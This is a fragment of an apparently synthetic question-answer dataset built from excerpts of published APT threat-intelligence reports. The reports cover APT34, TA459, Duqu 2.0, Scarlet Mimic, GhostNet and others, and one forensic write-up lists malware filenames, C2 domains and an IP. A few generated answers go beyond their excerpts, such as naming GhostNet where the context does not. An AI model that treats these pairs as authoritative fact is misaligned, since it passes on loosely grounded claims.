    "instruction": "New APT34 Malware Targets The Middle East\nFebruary 2, 2023\nAPT & Targeted Attacks\nWe analyze an infection campaign targeting organizations in the Middle East for cyberespionage in December 2022 using a new backdoor malware. The campaign abuses legitimate but compromised email accounts to send stolen data to external mail accounts controlled by the attackers.\nBy: Mohamed Fahmy, Sherif Magdy, Mahmoud Zohdy February 02, 2023 Read time: 8 min (2155 words)\nOn December 2022, we identified a suspicious executable (detected by Trend Micro as Trojan.MSIL.REDCAP.AD) that was dropped and executed on multiple machines. Our investigation led us to link this attack to advanced persistent threat (APT) group APT34, and the main goal is to steal users' credentials. Even in case of a password reset or change, the malware is capable of sending the new credentials to the threat actors. Moreover, after analyzing the backdoor variant deployed, we found the malware capable of new exfiltration techniques \u2014 the abuse of compromised mailbox accounts to send stolen data from the internal mail boxes to external mail accounts controlled by the attackers. While not new as a technique, this is the first instance that APT34 used this for their campaign deployment. Following this analysis, it is highly likely that this campaign's routine is only a small part of a bigger chain of deployments. Users and organizations are strongly advised to reinforce their current security measures and to be vigilant of the possible vectors abused for compromise.\nRoutine\nIn this section, we describe the attack infection flow and its respective stages, as well as share details on how the group uses emails to steal and exfiltrate critical information.\nQ: How does the new backdoor malware associated with APT34 manage to steal and exfiltrate user credentials even after a password reset? Additionally, explain the novel exfiltration technique employed by this malware.",
    "output": "The new backdoor malware detected as Trojan.MSIL.REDCAP.AD, linked to APT34, is designed to steal user credentials. Even if a user resets or changes their password, the malware is capable of capturing and sending the new credentials to the threat actors. This ensures continuous access to the compromised accounts. Furthermore, the malware employs a novel exfiltration technique where it abuses compromised mailbox accounts to send stolen data from internal mailboxes to external mail accounts controlled by the attackers. Although this technique itself is not new, this is the first known instance where APT34 has utilized it in their campaigns. This approach allows the attackers to exfiltrate sensitive information without raising immediate suspicion, as the data transfer appears to be legitimate email communication.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: APT Targets Financial Analysts with CVE-2017-0199\nOn April 20, Proofpoint observed a targeted campaign focused on financial analysts working at top global financial firms operating in Russia and neighboring countries. These analysts were linked by their coverage of the telecommunications industry, making this targeting very similar to, and likely a continuation of, activity described in our \"(<https://www.proofpoint.com/us/threat-insight/post/PlugX-in-Russia>)In Pursuit of Optical Fibers and Troop Intel \" blog. This time, however, attackers opportunistically used spear-phishing emails with a Microsoft Word attachment exploiting the recently patched (<https://www.proofpoint.com/us/threat-insight/post/dridex-campaigns-millions-recipients-unpatched-microsoft-zero-day>)CVE-2017-0199 to deploy the (<https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx>)ZeroT Trojan, which in turn downloaded the PlugX Remote Access Trojan (RAT).\nProofpoint is tracking this attacker, believed to operate out of China, as TA459. The actor typically targets Central Asian countries, Russia, Belarus, Mongolia, and others. TA549 possesses a diverse malware arsenal including PlugX, NetTraveler, and ZeroT. [1][2][3]\nIn this blog, we also document other 2017 activity so far by this attack group, including their distribution of ZeroT malware and secondary payloads PCrat/Gh0st.\nAnswer this question: Why did the APT group TA459 choose to use CVE-2017-0199 in their targeted campaign against financial analysts, and how does this vulnerability facilitate the deployment of malware such as ZeroT and PlugX?",
    "output": "The APT group TA459 chose to use CVE-2017-0199 in their targeted campaign because it was a recently patched vulnerability that many systems might not have updated yet, making it an opportune vector for attack. This vulnerability facilitates the deployment of malware by allowing attackers to exploit a flaw in Microsoft Word attachments. When a user opens the malicious Word document, the vulnerability enables the execution of arbitrary code, which in this case was used to deploy the ZeroT Trojan. The ZeroT Trojan then downloaded the PlugX Remote Access Trojan (RAT), giving the attackers remote access to the compromised system. This multi-stage approach leverages the initial exploit to gain a foothold and subsequently deploy more sophisticated malware for further control and data exfiltration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nFireEye Labs recently discovered a previously unknown variant of the APT backdoor XSLCmd \u2013 OSX.XSLCmd \u2013 which is designed to compromise Apple OS X systems. This backdoor shares a significant portion of its code with the Windows-based version of the XSLCmd backdoor that has been around since at least 2009.\nThis discovery, along with other industry findings, is a clear indicator that APT threat actors are shifting their eyes to OS X as it becomes an increasingly popular computing platform.\nAcross the global threat landscape, there has been a clear history of leveraging (or porting) Windows malware to the Apple OS X platform. In 2012, AlienVault discovered a document file exploiting an older vulnerability in Microsoft Word that installs a backdoor named \"(<http://www.alienvault.com/open-threat-exchange/blog/ms-office-exploit-that-targets-macos-x-seen-in-the-wild-delivers-mac-contro>)MacControl\" on OS X systems. The group responsible for those attacks had been targeting Tibetan non-government organizations (NGOs). (<http://bad-bytes.blogspot.com/2012/07/maccontrol-cyber-espionage-rat-linked.html>)It was later discovered that the code for this backdoor was borrowed from an existing Windows backdoor, whose source code can be found on several Chinese programming forums.\nIn 2013, Kaspersky reported on a threat actor group they named \"(<http://securelist.com/blog/research/57331/the-icefog-apt-a-tale-of-cloak-and-three-daggers/>)IceFog\" that had been attacking a large number of entities related to military, mass media, and technology in South Korea and Japan. This group developed their own backdoor for both Windows and OS X. And just this year, Kaspersky published a report on a group they named (<http://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf>)\"Careto/Mask\" that utilized an open source netcat-like project designed to run on *nix and Windows systems named 'sbd' which they wrapped in a custom built installer for OS X.\nBased on our historical intelligence, we believe the XSLCmd backdoor is used by APT, including a group that we call \"GREF.\" We track this threat group as \"GREF\" due to their propensity to use a variety of Google references in their activities \u2013 some of which will be outlined later in this report. Our tracking of GREF dates back to at least the 2009 timeframe, but we believe they were active prior to this time as well. Historically, GREF has targeted a wide range of organizations including the US Defense Industrial Base (DIB), electronics and engineering companies worldwide, as well as foundations and other NGO's, especially those with interests in Asia.\n\nWhat insights can be drawn from the historical intelligence on the XSLCmd backdoor and its association with the APT group known as 'GREF'? How does understanding the tactics and targets of this group help in improving cybersecurity strategies?",
    "output": "Historical intelligence suggests that the XSLCmd backdoor has been associated with the APT group 'GREF', which has been active since at least 2009. GREF is known for targeting a diverse range of organizations, including the US Defense Industrial Base, electronics and engineering companies, and NGOs, particularly those with interests in Asia. Understanding the tactics and targets of GREF helps cybersecurity experts tailor their defenses more effectively. By knowing the types of organizations and regions that GREF typically targets, security professionals can implement more specific and proactive measures to protect against these advanced persistent threats. Additionally, recognizing the group's tendency to use Google references in their activities can aid in identifying and mitigating potential threats more quickly.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1.Introduction\nStuxnet is probably the most well-known malware of our times. Its fame stems from the facts that it targeted a very specific industrial facility, namely a uranium enrichment plant in Iran, it aimed at physical destruction of uranium centrifuges, and it apparently accomplished its mission successfully. In addition to all these characteristics, IT security experts also appreciate its technical sophistication and the zero-day exploits that it used. Stuxnet was also an alarm to the developed world: it shed light on the capabilities of advanced attackers, and at the same time, on the numerous weaknesses of our computing infrastructure. Putting these two together, people started to feel hopelessly vulnerable.\nYet, unfortunately, Stuxnet is not a unique example for a highly sophisticated targeted threat, but there are numerous other pieces of malware of similar kind, including Duqu, Flame, Regin, etc. Among those, Duqu is particularly interesting, not only because we discovered it back in 2011, but because our analysis pointed out that - while Duqu's objective is different - it has very strong similarities to Stuxnet in terms of architecture, code, and methods to achieve stealthiness. Today, it is widely believed within the IT security community that Duqu was created by the same attackers who created Stuxnet.\nAnd now we have a new member of the same family! Last month, we received interesting samples from Kaspersky Lab with a hint that they might be related to the Duqu samples of 2011; however, these new samples are from 2014. Our common understanding was that it would be interesting to figure out whether this new threat is indeed related to the old Duqu attack, and we in the CrySyS Lab should try to focus our analysis efforts on answering this question. It is important to emphasize that we did our analysis independently from Kaspersky Lab: we did not read their preliminary report and they did not share any of their findings with us (apart from the samples that we received from them).\nThe analysis results performed by Kaspersky Lab can be read in the following report:\nIn this report, we present the results of our comparative analysis of the old version of Duqu and the new version, codenamed \"Duqu 2.0\". We concentrate on the description of the relevant similarities and differences we have found between the two malware samples.\n\nQ: How does the architecture and code of Duqu compare to Stuxnet, and what implications does this have for attribution and understanding the capabilities of the attackers?",
    "output": "A: The architecture, code, and methods used by Duqu to achieve stealthiness are very similar to those of Stuxnet. This similarity has led the IT security community to believe that Duqu was created by the same attackers who created Stuxnet. Understanding these similarities helps in attributing the attacks to the same group and provides insights into the advanced capabilities and techniques employed by these attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Welcome to the latest issue of the ESET APT Activity Report!\nThis report summarizes the activities of selected advanced persistent threat (APT) groups that were observed, investigated, and analyzed by ESET researchers from April 2023 until the end of September 2023. In the monitored timespan, we observed a notable strategy of APT groups utilizing the exploitation of known vulnerabilities to exfiltrate data from governmental entities or related organizations. Russia-aligned Sednit and Sandworm, North Korea-aligned Konni, and geographically unattributed Winter Vivern and Sturgeon Phisher seized the opportunity to exploit vulnerabilities in WinRAR (Sednit, SturgeonPhisher, and Konni), Roundcube (Sednit and Winter Vivern), Zimbra (Winter Vivern), and Outlook for Windows (Sednit) to target various governmental organizations in Ukraine, Europe, and Central Asia. Regarding China-aligned threat actors, GALLIUM probably exploited weaknesses in Microsoft Exchange servers or IIS servers, extending its targeting from telecommunications operators to government organizations around the world; MirrorFace probably exploited vulnerabilities in the Proself online storage service; and TA410 probably exploited flaws in the Adobe ColdFusion application server.\nIran- and Middle East-aligned groups continued to operate at high volume, primarily focusing on espionage and data theft from organizations in Israel. Notably, Iran-aligned MuddyWater also targeted\nan unidentified entity in Saudi Arabia, deploying a payload that suggests the possibility of this threat actor serving as an access development team for a more advanced group.\nThe prime target of Russia-aligned groups remained Ukraine, where we discovered new versions of the known wipers RoarBat and NikoWiper, and a new wiper we named SharpNikoWiper, all deployed by Sandworm. Interestingly, while other groups \u2013 such as Gamaredon, GREF, and SturgeonPhisher \u2013 target Telegram users to try to exfiltrate information or at least some Telegram-related metadata, Sandworm uses this service for active measure purposes, advertising its cyber-sabotage operations. However, Gamaredon remained the most active group in Ukraine, significantly enhancing its data-collecting capabilities by redeveloping existing tools and deploying new ones.\nNorth Korea-aligned groups continued to focus on Japan, South Korea, and South Korea-focused entities, employing carefully crafted spearphishing emails. The most active Lazarus scheme observed was Operation DreamJob, luring targets with fake job offers for lucrative positions. This group consistently demonstrated its capability to create malware for all major desktop platforms. Finally, our researchers uncovered the operations of three previously unidentified China-aligned\ngroups: DigitalRecyclers, repeatedly compromising a governmental organization in the EU; TheWizards, conducting adversary-in-the-middle attacks; and PerplexedGoblin, targeting another government organization in the EU.\nESET APT Activity Reports contain only a fraction of the cybersecurity intelligence data provided to customers of ESET's private APT reports. ESET researchers prepare in-depth technical reports and frequent activity summaries detailing activities of specific APT groups, in the form of ESET APT Reports PREMIUM, to help organizations tasked with protecting citizens, critical national infrastructure, and high-value assets from criminal and nation-state-directed cyberattacks. Comprehensive descriptions of activities described in this document were therefore previously provided exclusively to our premium customers. More information about ESET APT Reports PREMIUM and its delivery of high-quality, strategic, actionable, and tactical cybersecurity threat intelligence is available at the .\nESET products protect our customers' systems from the malicious activities described in this report. Intelligence shared here is based mostly on proprietary ESET telemetry data and has been verified by ESET researchers.\nQuestion: How did the APT groups Sednit, Sandworm, Konni, Winter Vivern, and SturgeonPhisher leverage known vulnerabilities to target governmental organizations, and what were the specific software applications they exploited?",
    "output": "Answer: The APT groups Sednit, Sandworm, Konni, Winter Vivern, and SturgeonPhisher utilized known vulnerabilities in various software applications to target governmental organizations. Specifically, Sednit, SturgeonPhisher, and Konni exploited vulnerabilities in WinRAR. Additionally, Sednit and Winter Vivern targeted Roundcube, while Winter Vivern also exploited Zimbra. Sednit further extended its reach by exploiting Outlook for Windows. These vulnerabilities allowed the groups to exfiltrate data from governmental entities or related organizations in Ukraine, Europe, and Central Asia.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Executive Summary\nOver the past seven months, Unit 42 has been investigating a series of attacks we attribute to a group we have code named \"Scarlet Mimic.\" The attacks began over four years ago and their targeting pattern suggests that this adversary's primary mission is to gather information about minority rights activists. We do not have evidence directly linking these attacks to a government source, but the information derived from these activities supports an assessment that a group or groups with motivations similar to the stated position of the Chinese government in relation to these targets is involved.\nThe goal of this report is to expose the tools, tactics and infrastructure deployed by Scarlet Mimic in order to increase awareness of this threat and decrease its operational success through deployment of prevention and detection countermeasures. From our vantage point, we are not able to identify which attacks have been successful against which organizations. But the fact that the tools Scarlet Mimic deploys have been under development for years suggests an active adversary that has been successful in some percentage of its operations. Based on our analysis, we are also seeing Scarlet Mimic start to expand its espionage efforts from PCs to mobile devices, marking an evolution in its tactics.\nIndividuals and groups of all different types may become the target of cyber espionage campaigns. The most well known victims of cyber espionage are typically government organizations or high\u00adtech companies, but it's important to recognize that espionage\u00adfocused adversaries are tasked to collect information from many sources.\nThe attacks we attribute to Scarlet Mimic have primarily targeted Uyghur and Tibetan activists as well as those who are interested in their causes. Both the Tibetan community and the Uyghurs, a Turkic Muslim minority residing primarily in northwest China, have been targets of multiple sophisticated attacks in the past decade. Both also have history of strained relationships with the government of the People's Republic of China (PRC), though we do not have evidence that links Scarlet Mimic attacks to the PRC.\nScarlet Mimic attacks have also been identified against government organizations in Russia and India, who are responsible for tracking activist and terrorist activities. While we do not know the precise target of each of the Scarlet Mimic attacks, many of them align to the patterns described above.\nThe Scarlet Mimic attacks primarily center around the use of a Windows backdoor named \"FakeM.\" It\nwas first described by Trend Micro in 2013 and was named FakeM because its primary command and control traffic mimicked Windows Messenger and Yahoo! Messenger network traffic to evade detection. We have identified two subsequent variants of the FakeM family, which has undergone significant changes since it was exposed in 2013. We have also identified nine distinct \"loader\" malware families, which Scarlet Mimic appears to use to avoid detection when infecting a system.\nIn addition to the FakeM variants, Scarlet Mimic has deployed Trojans that target the Mac OS X and Android operating systems. We have linked these attacks to Scarlet Mimic through analysis of their command and control (C2) infrastructure.\nTo infect individuals with access to the data the actors desire, Scarlet Mimic deploys both spear\u00adphishing and watering hole (strategic web compromise) attacks. Using these tactics they can directly target previously identified individuals (spear phishing) as well as unidentified individuals who are interested in a specific subject (watering hole). In their spear phishing attacks, Scarlet Mimic has exploited five separate vulnerabilities. However, in many cases they chose to forgo exploiting a software vulnerability and used self\u00adextracting (SFX) RAR archives that use the Right\u00adto\u00adLeft Override character to mask the true file extension, tricking victims into opening executable files.\nAs with many other attackers who use spear\u00adphishing to infect victims, Scarlet Mimic makes heavy use of \"decoy\" files. These are legitimate documents that contain content relevant to the subject of the spear phishing e\u00admail. After the system is infected, the malware displays the decoy document to trick the user into believing nothing harmful has occurred. These decoy documents allow us to identify the theme of the spear phishing e\u00admail and in some cases the target of the attack.\nThe most recent Scarlet Mimic attacks we have identified were conducted in 2015 and suggest the group has a significant interest in both Muslim activists and those interested in critiques of the Russian government and Russian President Vladimir Putin. Based on their previous targets we suspect these individuals may be targeted based on the information they posses on activist groups.\nThe primary source of data used in this analysis is Palo Alto Networks , which analyzes malware used in attacks across the world. The system also analyzes malware samples collected (<http://cyberthreatalliance.org/>)through a sharing partnership with other security vendors, including our partners in the . To connect attacks to each other based on malware behavior and command and control infrastructure, we relied on threat intelligence. AutoFocus users can view all of the files related to Scarlet Mimic and the malware associated with the group using the following links:\n\nHow does Scarlet Mimic's use of the FakeM backdoor evolve over time, and what strategies does the group employ to avoid detection?",
    "output": "Scarlet Mimic's use of the FakeM backdoor has evolved significantly since it was first described by Trend Micro in 2013. Initially, FakeM mimicked Windows Messenger and Yahoo! Messenger network traffic to evade detection. Since then, two subsequent variants of the FakeM family have been identified, indicating ongoing development and refinement. To avoid detection, Scarlet Mimic employs nine distinct 'loader' malware families. These loaders are used to infect systems without raising alarms, demonstrating the group's commitment to stealth and continuous improvement in their tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Applying the evidence-based approach to cyber attacks: the challenge of attribution\nDetermining those responsible for cyber attacks, commonly known as the attribution problem, is a major challenge. The Internet was never built with security as a priority. The current version of the Internet's address assignment system, IP V4, provides a wealth of loopholes and methods by which a perpetrator can mask his or her real identity and location. Online identities and servers can be cleverly hidden. Packet flows and connections can be masked and redirected through multiple servers. A clever attacker can often hijack a machine belonging to an otherwise innocent organization and use it as a base for launching attacks.\nHand-in-hand with the problem of attribution is the difficulty of identifying motivating factors behind a cyber attack. Many perpetrators of Internet-based attacks and exploits are individuals whose motivation can vary from a simple profit motive through to fear of prosecution or strong emotional feelings, including religious belief and nationalism. Many cyber attacks and exploits which seem to benefit states may be the work of third-party actors operating under a variety of motivations. This makes it difficult to separate the motivation of the individual from the potential motives of the party on whose behalf the attacks have occurred, or a prospective client to which the perpetrator is trying to market his or her wares. In either case, the challenge of identifying perpetrators and understanding their motives gives state actors convenient plausible deniability and the ability to officially distance themselves from attacks.\nCyber campaigns can also take on a life of their own. Even though a state might 'seed' a particular campaign through tacit encouragement or the absence of sanctions or prosecutions, these campaigns are inherently chaotic and unpredictable in scope and outcome.20 Phenomena such as spontaneous 'cyber rioting' can surpass the initial purposes of the cyber campaign. Low barriers to entry to this sort of activity enable anyone with a computer and Internet connection to take part in a cyberattack.21 For the most part, governments appear to passively benefit from online manifestations of nationalistic and patriotic fervour, although outcomes are inherently unpredictable.22\nIn China, the authorities most likely perceive individual attackers and their online activities as convenient instruments of national power.23 A favourite target of Chinese hackers is Taiwanese computer systems, especially during times of Sino-Taiwanese tensions, such as elections and\nreferendums.24 In April 2001, following the death of a Chinese fighter pilot after a collision with an American spy plane near the Chinese island of Hainan, Chinese hackers began a sustained campaign to target American computer networks. No link was made with elements of the Chinese government.25\n20 http://www.yorku.ca/robarts/projects/canada-watch/obama/pdfs/Deibert.pdf\n21 http://worldanalysis.net/modules/news/article.php?storyid=343\n22 For instance, during the Russia-Georgia conflict in August 2008, tools were made available online for those who wished to participate in the ongoing 'cyber-war' against Georgian websites. http://blog.wired.com/defense/2008/10/government-and.html ; http://www.slate.com/id/2197514\n23 http://findarticles.com/p/articles/mi_m0PBZ/is_6_88/ai_n31140190 ; http://fmso.leavenworth.army.mil/documents/Beijings-rising-hackers.pdf\nHowever, governments cannot always preserve direct control over such activities; groups can maintain their freelance and autonomous status and undertake their own cyber initiatives that may not always attain official sanction or serve state interests.26\nBig Headline: Targeting Tibet\nAccusations of Chinese cyber war being waged against the Tibetan community have been commonplace for the past several years. The Chinese government has been accused of orchestrating and encouraging such activity as part of a wider strategy to crack down on dissident groups and subversive activity.27 Earlier research has traced these attacks against Tibetan groups to IP addresses registered in the People's Republic of China. The attacks used malware hidden in legitimate-looking email messages, infecting unsuspecting users' computers and exploiting the data on it by sending it to control servers.28\nThe identity of the attackers has never been attributed in a conclusive manner to any specific group or individual.29 The motivation of those behind the attacks, despite conjecture, is also unproven.\nIn earlier studies, researchers focused on attacks specifically targeting the Tibetan community. But a wide variety of other victims of computer penetrations have reported infections similar to those used against Tibetan organizations, following a similar modus operandi and also reporting to control servers usually located in China. These additional targets include the Falun Gong30, the U.S. Government, and multinational corporations.31 While reports of these targeted attacks have circulated, the extent to which attackers successfully exploited the affected computers is unknown.\n24 http://fmso.leavenworth.army.mil/documents/Beijings-rising-hackers.pdf\n25 http://news.bbc.co.uk/2/hi/americas/1305755.stm\n26 http://fmso.leavenworth.army.mil/documents/Beijings-rising-hackers.pdf\n27 http://www.washingtonpost.com/wp-dyn/content/article/2008/03/21/AR2008032102605.html\n28 See, http://isc.sans.org/diary.html?storyid=4177 ; http://isc.sans.org/diary.html?storyid=4176 and http://archive.cert.uni-stuttgart. de/isn/2002/09/msg00086.html for background information on these attacks.\n29 Attribution for previous penetrations of Tibetan groups has never been publicly attributed and is not available from open sources. Classified studies may reveal a finer grained detail, as many of the attacks are relatively unsophisticated, and given proper assets, could be traced back to specific locations and presumably individuals.\n30 Research by Maarten Van Horenbeeck shows that similar attacks have targeted the Falun Gong. http://www.daemon.be/ maarten/Crouching_Powerpoint_Hidden_Trojan_24C3.pdf and http://isc.sans.org/presentations/SANSFIRE2008-Is_Troy_Burning_ Vanhorenbeeck.pdf\n31 See http://www.businessweek.com/print/magazine/content/08_16/b4080032218430.htm\n\nAnswer this question based on the above context: How does the GhostNet APT leverage the attribution problem to conduct cyber attacks, and what are the primary challenges in identifying the perpetrators and their motivations?",
    "output": "The GhostNet APT leverages the attribution problem by exploiting the inherent insecurity of the Internet's address assignment system, IP V4, which allows perpetrators to mask their real identities and locations. Attackers can hide online identities and servers, mask packet flows, and hijack innocent machines to launch attacks. The primary challenges in identifying perpetrators include the difficulty in tracing the origin of attacks due to these masking techniques. Additionally, understanding the motivations behind cyber attacks is complex because perpetrators can range from individuals driven by profit, fear of prosecution, or strong emotional feelings, to third-party actors with various motivations. This complexity makes it hard to distinguish between the motives of individuals and those of state actors, providing state actors with plausible deniability.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What role did the firm Huaying Haitai play in the broader context of STONE PANDA's operations, and how does its association with government-sponsored competitions and recruitment practices support the findings of the report?",
    "output": "The firm Huaying Haitai played a significant role in the broader context of STONE PANDA's operations by being connected to a Chinese Ministry of Industry and Information Technology (MIIT) sponsored attack and defense competition. This involvement is similar to GOTHIC PANDA's ties to an active defense lab sponsored by China Information Technology Evaluation Center (CNITSEC), indicating a pattern of state-sponsored cyber activities. Additionally, Huaying Haitai has previously hired Chinese students with Japanese language skills, which is notable because STONE PANDA has engaged in several campaigns targeting Japanese firms. This recruitment practice suggests that the firm's activities align with the targets and objectives of STONE PANDA. The association of Huaying Haitai with government-sponsored competitions and its specific recruitment practices provide further evidence supporting the connection between STONE PANDA and state-sponsored cyber operations, particularly those linked to the MSS Tianjin Bureau.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 4.2.4 ECAT Analysis \u2013 System XXXXNAPP02\nThe analyst triaged system XXXXAPP02 next, and\t\n \u00a0focused\t\n \u00a0on\t\n \u00a0the C:\\Windows\\system32\\ folder\t\n \u00a0where frtest.dat\t\n \u00a0(Trojan.FF-\u00ad\u2010RAT) was located. The analyst noticed\t\n \u00a0several additional suspicious files in this folder, which were considered suspicious\t\n \u00a0for the following reasons:\n7 A\t\n  detailed\t\n  technical description\t\n  of how these configuration\t\n  files were obfuscated\t\n  can\t\n  be found\t\n  on\t\n  Appendix I.\n1. File\t\n  frtest.dat was already known to be malicious.\n2. Files fmnonull.dat (Trojan.FF-\u00ad\u2010RAT) and\t\n \u00a0Mstcpnqe.dat (Trojan.Derusbi)\t\n \u00a0looked suspicious for\t\n \u00a0the following reasons:\na. There are only a handful of .dat files in\t\n  the system32 folder by default, and their timestamps including\t\n  the $FN are much older\t\n  (i.e. during the OS installation time). These two files were time stomped to look older (compare $FN Creation time vs $SI\t\n  Creation time) but in\t\n  fact were created\t\n  on\t\n  25 June and\t\n  26 June 2013 respectively.\nb. Both\t\n  files were created\t\n  (looking at $FN timestamp) very early in\t\n  the morning (a substantial amount\t\n  of\t\n  malicious activity in this case occurred between 12:00AM and 6:00AM EST).\n3. File\t\n  ntmrsvc.dll (Trojan.Lurker2)\t\n  may look like a legitimate filename (in fact\t\n  it\t\n  is only one character\t\n  different\t\n  from the legitimate filename ntmssvc.dll). The most\t\n  suspicious aspect\t\n  of\t\n  this file was that\t\n  it\t\n  was created recently with no other\t\n  activity around it\t\n  in the system32 folder. When\t\n  looking at all the files in\t\n  the system and\t\n  sorting by $FN, another suspicious\t\n  file in the C:\\Windows\\Temp folder was identified.\n4. Files seclogon.nls, senseron.dll, and seclogon.nt are\t\n  suspicious for the\t\n  following\t\n  reasons:\na. Time stomped.\nb. Created\t\n  during the early hours in\t\n  the morning.\nOn\t\n  this system the analyst discovered\t\n  two\t\n  new Trojan\t\n  families Trojan.Derusbi and\t\n  Trojan.Lurker2. The analyst created Yara\t\n  signatures\t\n  for each of them.\nSmall Headline: 4.2.5 ECAT Analysis \u2013 Recycler folder\nAt this stage of the investigation\t\n  the analyst had\t\n  discovered four\t\n  different\t\n  Trojan families and several infected hosts. Very often APT adversaries are\t\n  not careful enough to cleanup after themselves, and relevant artifacts can be\t\n  found by exploiting the tendencies of the adversary. For example, when RSA performed memory analysis on the early stages\t\n  of this\t\n  case, it discovered (via ShimCache analysis) that the adversary had a preference for storing relevant files under\t\n  C:\\Recycler\\ and C:\\Windows\\addins\\.\nSince\t\n  certain directories do not typically contain certain types of\t\n  files, the analyst\t\n  used ECAT to query these directories for files that are out of place. For example, the root of the Recycler folder should\t\n  not contain\t\n  any files at all, so the\t\n  analyst requested that ECAT\t\n  download C:\\Recycler\\*.*. Here are the files that\t\n  were retrieved from the C:\\Recycler\\ directory from various systems:\nSmall Headline: 4.2.6 ECAT Analysis \u2013 System XXME\nThe triage process of system named XXME led to the discovery\t\n  of some interesting artifacts. The first relevant fact was that file C:\\Recycler\\net.txt was created in 2010. This event confirms\t\n  initial\t\n  suspicions from the earliest stages of this case, that\t\n  the earliest\t\n  evidence of\t\n  unauthorized activity goes\t\n  back to 2010:\nTime analysis did not show anything else relevant from 2010. When the analyst performed time analysis around the bmp#.tmp\t\n  files the following relevant\t\n  activity was discovered:\nDespite the unusual size of file MSODBC.dll at about 50MB8,\t\n  this file along with file mscmos.sys were found to be components\t\n  of Trojan.Gh0st.\t\n  The adversary artificially\t\n  increased the size of file MSODBC.dll by\t\n  appending junk\t\n  data to the end of\t\n  it, presumably to avoid suspicion. A quick look at\t\n  mscmos.sys reveals that\t\n  it\t\n  was an obfuscated (XOR with 0x99) configuration file that\t\n  contained domain\t\n  name ru.pad62.com, and\t\n  the victim's company name appeared\t\n  at the\t\n  beginning\t\n  of the\t\n  file.\nWhen looking at the July 4th 2012\t\n  activity the analyst observed another interesting\t\n  file:\nDue to the time proximity to the bmp#.tmp\t\n  file,\t\n  the analyst noticed that an executable\t\n  file\t\n  was\t\n  cached under the administrator.NY\t\n  account. This file\t\n  was also found to be highly suspicious because its filename contained the\ncompany\t\n  name in it (blurred for\t\n  this reason).\t\n  The\t\n  fact that this file\t\n  is cached implies that the\t\n  adversary had GUI access to this system and used Internet Explorer to download this file. Whenever relevant cached files are\t\n  discovered\t\n  on\t\n  a system, the analyst investigates the Internet History of that user's\t\n  profile to determine from where this file was downloaded. Internet\t\n  history showed that\t\n  the malicious file was downloaded from: www.haircollalife.com.\n8 The size of a\t\n  typical Trojan is less than 1MB; with a\t\n  large\t\n  percentage\t\n  of Trojan sizes falling\t\n  between (10KB \u2013 350KB)\nThe file in question also appeared to have\t\n  been digitally signed; however this certificate was no\t\n  longer valid. This downloaded\t\n  file was found\t\n  to\t\n  be a dropper for Trojan.Gh0st. When executed it drops three files: 6to4adv.dll, BusMgr.sys, and\t\n  SvcPack.dat.\nDigging through the rest of the Internet history, another suspicious file was downloaded on 26 August 2013 named x8.txt from http://198.27.112.7:666.\t\n \u00a0The downloaded file was also a legitimately digitally signed executable file (i.e.\t\n \u00a0another Trojan.FF-\u00ad\u2010RAT variant).\nEvidence found in this system shows that the APT\t\n \u00a0group that is using digitally signed Trojans deployed a\t\n \u00a0Trojan.Gh0St variant (MSODBC.dll) in May\t\n \u00a02012. It then deployed a digitally\t\n \u00a0signed Trojan.Gh0st variant in July 2012. Internet research on the digitally signed Trojan.Gh0st\t\n \u00a0showed that\t\n \u00a0Sophos started identifying this variant as Troj/PWS-\u00ad\u2010BYU on\t\n \u00a017\t\n \u00a0July 20129 .\t\n \u00a0CompanyA runs Sophos AV in \t\n \u00a0their \t\n \u00a0environment, \t\n \u00a0so \t\n \u00a0the \t\n \u00a0signed \t\n \u00a0Trojan.Gh0st \t\n \u00a0only \t\n \u00a0worked \t\n \u00a0for \t\n \u00a0about \t\n \u00a013 days before it was quarantined. The unsigned\t\n \u00a0version\t\n \u00a0of Trojan.Gh0st was also\t\n \u00a0no\t\n \u00a0longer active because malware analysis showed that\t\n \u00a0MSODBC.dll attempts to load a file named JET.dll, which was\t\n \u00a0no longer present on any system. So, here\t\n \u00a0we\t\n \u00a0are\t\n \u00a0dealing\t\n \u00a0with the\t\n \u00a0remnants of a\t\n \u00a0Trojan that is no longer active\t\n \u00a0in this network. The\t\n \u00a0analyst used ECAT to find all systems that\t\n \u00a0still contained Trojan.Gh0st artifacts, namely the presence of file svcpack.dat,\t\n \u00a0and \t\n \u00a0found several such systems:\nFile\t\n \u00a0svcpack.dat contains Trojan configuration information\t\n \u00a0at the beginning of the file, which\t\n \u00a0is obfuscated\t\n \u00a0via a single byte XOR (0x11). Here is\t\n \u00a0an example of a de-\u00ad\u2010obfuscated\t\n \u00a0configuration\t\n \u00a0data from a SvcPack.dat file:\n9 https://secure2.sophos.com/en-\u00ad\u2010us/threat-\u00ad\u2010center/threat-\u00ad\u2010analyses/viruses-\u00ad\u2010and-\u00ad\u2010spyware/Troj~PWS-\u00ad\u2010BYU/detailed-\u00ad\u2010analysis.aspx\nSmall Headline: 4.2.7 ECAT Analysis \u2013 System XX22\nThe analyst started to triage system XX22\t\n  by performing time analysis around the files discovered in the C:\\Recycler folder\t\n  of\t\n  this system. MFT analysis also revealed some deleted text\t\n  files that\t\n  used to exist\t\n  in this folder. These text\t\n  files were recovered and were found to contain recursive directory listings of drives of other systems in the network.\t\n  Typically APT\t\n  adversaries get recursive directory listings to determine which filenames look interesting for exfiltration.\nLooking\t\n  at the\t\n  activity\t\n  around file b.exe the analyst\t\n  discovered that\t\n  it\t\n  was responsible for\t\n  dropping files sbiedll.dll and helper.url as shown below:\nThese three malicious files are components of what RSA IR refers to as Trojan.PlugX. While looking at the c:\\windows\\system32 folder the analyst noticed a highly suspicious\t\n  file named svchost.\t\n  This file was very suspicious\nbecause it contains the name of svchost.exe, which\t\n  is a critical Windows file, but it has no\t\n  extension. When the 